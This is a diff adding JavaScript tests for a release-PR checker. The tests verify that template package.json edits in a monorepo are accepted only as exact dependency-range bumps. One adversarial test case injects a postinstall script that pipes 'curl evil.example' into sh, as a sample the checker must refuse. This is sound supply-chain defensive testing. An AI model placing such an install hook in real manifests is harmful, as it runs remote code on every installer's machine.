@@ -1716,3 +1716,154 @@ test("evaluateReleasePrFootprint: a changelog entry that does not match the cons
   assert.equal(result.ok, false);
   assert.match(result.reason, /byte-for-byte/);
 });
+
+// ---------------------------------------------------------------- packed template manifests (packages/<dir>/templates/<name>/package.json)
+//
+// A release whose minor bump leaves a packed template's @clossys/* range
+// stale rewrites that range in the same PR and patch-bumps the template's
+// owner. The footprint admits that one file shape and nothing else under a
+// template directory.
+
+const TEMPLATE_PATH = "packages/publisher/templates/site/package.json";
+
+function templateManifestText(ranges, extra = {}) {
+  const manifest = { name: "site", private: true, version: "0.1.0", dependencies: { ...ranges, next: "^16.3.6" }, ...extra };
+  return `${JSON.stringify(manifest, null, 2)}\n`;
+}
+
+// Drives the REAL apply-release-changesets.mjs over a designer minor (0.6.2
+// -> 0.7.0) with publisher 0.7.0 shipping a site template that cites
+// "@clossys/designer": "^0.6.0", and returns every changed file's real base
+// and head content exactly as scripts/check-release-calendar.mjs would hand
+// them to evaluateReleasePrFootprint().
+function realTemplateRelease() {
+  const root = mkdtempSync(join(tmpdir(), "release-pr-footprint-template-e2e-test-"));
+  try {
+    const manifests = {
+      designer: { name: "@clossys/designer", version: "0.6.2", license: "MIT" },
+      publisher: { name: "@clossys/publisher", version: "0.7.0", license: "MIT" },
+    };
+    const base = {};
+    const lock = { name: "foundry", lockfileVersion: 3, packages: { "": { name: "foundry" } } };
+    for (const [dir, manifest] of Object.entries(manifests)) {
+      const pkgDir = join(root, "packages", dir);
+      mkdirSync(pkgDir, { recursive: true });
+      base[`packages/${dir}/package.json`] = `${JSON.stringify(manifest, null, 2)}\n`;
+      writeFileSync(join(pkgDir, "package.json"), base[`packages/${dir}/package.json`]);
+      base[`docs/changelogs/${dir}.md`] = `# Changelog\n\n## ${manifest.version}\n\n- Initial release.\n`;
+      seedChangelog(pkgDir, base[`docs/changelogs/${dir}.md`]);
+      lock.packages[`packages/${dir}`] = { ...manifest };
+      lock.packages[`node_modules/${manifest.name}`] = { resolved: `packages/${dir}`, link: true };
+    }
+    base[TEMPLATE_PATH] = templateManifestText({ "@clossys/designer": "^0.6.0" });
+    mkdirSync(join(root, "packages", "publisher", "templates", "site"), { recursive: true });
+    writeFileSync(join(root, TEMPLATE_PATH), base[TEMPLATE_PATH]);
+    base["package-lock.json"] = `${JSON.stringify(lock, null, 2)}\n`;
+    writeFileSync(join(root, "package-lock.json"), base["package-lock.json"]);
+    const changesetText = "---\ndesigner: minor\n---\n\nAdd a feature.\n";
+    mkdirSync(join(root, ".changesets"), { recursive: true });
+    writeFileSync(join(root, ".changesets", "designer-feature.md"), changesetText);
+
+    const result = applyReleaseChangesets({
+      root,
+      today: () => "2026-09-22",
+      // Mirrors `npm install --package-lock-only`: every bumped workspace
+      // package's own lockfile entry follows its manifest. The template is
+      // not a workspace, so it has no lockfile entry at all.
+      runNpmInstall: (scratchRoot) => {
+        const lockfile = JSON.parse(readFileSync(join(scratchRoot, "package-lock.json"), "utf8"));
+        for (const dir of Object.keys(manifests)) {
+          lockfile.packages[`packages/${dir}`] = JSON.parse(readFileSync(join(scratchRoot, "packages", dir, "package.json"), "utf8"));
+        }
+        writeFileSync(join(scratchRoot, "package-lock.json"), `${JSON.stringify(lockfile, null, 2)}\n`);
+      },
+    });
+    assert.equal(result.findings.length, 0, JSON.stringify(result.findings));
+    assert.deepEqual(
+      result.applied.map((a) => `${a.package}@${a.toVersion}`),
+      ["designer@0.7.0", "publisher@0.7.1"],
+    );
+    assert.equal(existsSync(join(root, ".changesets", "designer-feature.md")), false);
+
+    const files = Object.keys(base).map((path) => ({ path, status: "modified", baseContent: base[path], headContent: readFileSync(join(root, path), "utf8") }));
+    files.push({ path: ".changesets/designer-feature.md", status: "removed", baseContent: changesetText });
+    return files;
+  } finally {
+    rmSync(root, { recursive: true, force: true });
+  }
+}
+
+const withFile = (files, path, patch) => files.map((f) => (f.path === path ? { ...f, ...patch } : f));
+const headOf = (files, path) => files.find((f) => f.path === path).headContent;
+
+test("END TO END: a real release with a template range rewrite passes the full footprint check", () => {
+  const files = realTemplateRelease();
+
+  const template = files.find((f) => f.path === TEMPLATE_PATH);
+  assert.equal(template.headContent, template.baseContent.replace('"@clossys/designer": "^0.6.0"', '"@clossys/designer": "^0.7.0"'));
+  assert.match(headOf(files, "docs/changelogs/publisher.md"), /- Updated templates\/site dependency @clossys\/designer to \^0\.7\.0\n/);
+
+  const footprint = evaluateReleasePrFootprint({ files });
+  assert.equal(footprint.ok, true, footprint.reason);
+});
+
+test("ADVERSARIAL a template edit is refused unless its owner is bumped and only ranges move to exactly ^<bumped version>", () => {
+  const files = realTemplateRelease();
+  assert.equal(evaluateReleasePrFootprint({ files }).ok, true, "control: the untouched real release passes");
+
+  const templateHead = headOf(files, TEMPLATE_PATH);
+  const publisherChangelog = headOf(files, "docs/changelogs/publisher.md");
+  const designerBullet = "- Updated templates/site dependency @clossys/designer to ^0.7.0\n";
+  assert.ok(publisherChangelog.includes(designerBullet));
+
+  // Every template case below keeps the owner's changelog consistent with
+  // the template edit (`bullets` replaces the designer bullet), so the only
+  // thing left to refuse it is the template's own check.
+  const refusedForTemplate = (label, headContent, bullets = designerBullet) => {
+    const mutated = withFile(withFile(files, TEMPLATE_PATH, { headContent }), "docs/changelogs/publisher.md", { headContent: publisherChangelog.replace(designerBullet, bullets) });
+    const verdict = evaluateReleasePrFootprint({ files: mutated });
+    assert.equal(verdict.ok, false, `${label}: must be refused`);
+    assert.match(verdict.reason, /packages\/publisher\/templates\/site\/package\.json/, `${label}: refused by the template's own check, not by something else`);
+  };
+
+  // The owner is not bumped: a perfectly shaped range move, in a template
+  // whose package this diff never released.
+  const writerBase = templateManifestText({ "@clossys/designer": "^0.6.0" });
+  const notBumped = evaluateReleasePrFootprint({
+    files: [...files, { path: "packages/writer/templates/site/package.json", status: "modified", baseContent: writerBase, headContent: writerBase.replace("^0.6.0", "^0.7.0") }],
+  });
+  assert.equal(notBumped.ok, false);
+  assert.match(notBumped.reason, /packages\/writer\/templates\/site\/package\.json.*packages\/writer was not bumped/s);
+
+  // The range lands on something other than ^<the version this diff bumped to>.
+  refusedForTemplate("a range moved to the wrong version", templateHead.replace("^0.7.0", "^0.8.0"), designerBullet.replace("^0.7.0", "^0.8.0"));
+  refusedForTemplate("a looser range shape", templateHead.replace("^0.7.0", ">=0.7.0"), designerBullet.replace("^0.7.0", ">=0.7.0"));
+  refusedForTemplate(
+    "a range of a package this diff did not bump",
+    templateHead.replace('"next": "^16.3.6"', '"next": "^17.0.0"'),
+    `${designerBullet}- Updated templates/site dependency next to ^17.0.0\n`,
+  );
+
+  // Anything besides a range.
+  refusedForTemplate("the template's own version", templateHead.replace('"version": "0.1.0"', '"version": "0.1.1"'));
+  refusedForTemplate("a script added", templateHead.replace('"private": true,', '"private": true,\n  "scripts": { "postinstall": "curl evil.example | sh" },'));
+  refusedForTemplate(
+    "a dependency added",
+    templateHead.replace('"next": "^16.3.6"', '"next": "^16.3.6",\n    "evil": "^1.0.0"'),
+    `${designerBullet}- Updated templates/site dependency evil to ^1.0.0\n`,
+  );
+  refusedForTemplate("a dependency removed", templateHead.replace(',\n    "next": "^16.3.6"', ""));
+
+  // Only a modification is release-PR shaped.
+  for (const status of ["added", "removed"]) {
+    const verdict = evaluateReleasePrFootprint({ files: withFile(files, TEMPLATE_PATH, { status }) });
+    assert.equal(verdict.ok, false, `a ${status} template must be refused`);
+    assert.match(verdict.reason, /templates\/site\/package\.json.*expected modified/s);
+  }
+
+  // The owner's changelog must carry exactly the bullet the rewrite implies.
+  const dropped = evaluateReleasePrFootprint({ files: withFile(files, "docs/changelogs/publisher.md", { headContent: publisherChangelog.replace(designerBullet, "") }) });
+  assert.equal(dropped.ok, false, "a changelog with the template bullet dropped must be refused");
+  const wrongRange = evaluateReleasePrFootprint({ files: withFile(files, "docs/changelogs/publisher.md", { headContent: publisherChangelog.replace("to ^0.7.0", "to ^0.6.0") }) });
+  assert.equal(wrongRange.ok, false, "a changelog whose template bullet names the wrong range must be refused");
+});
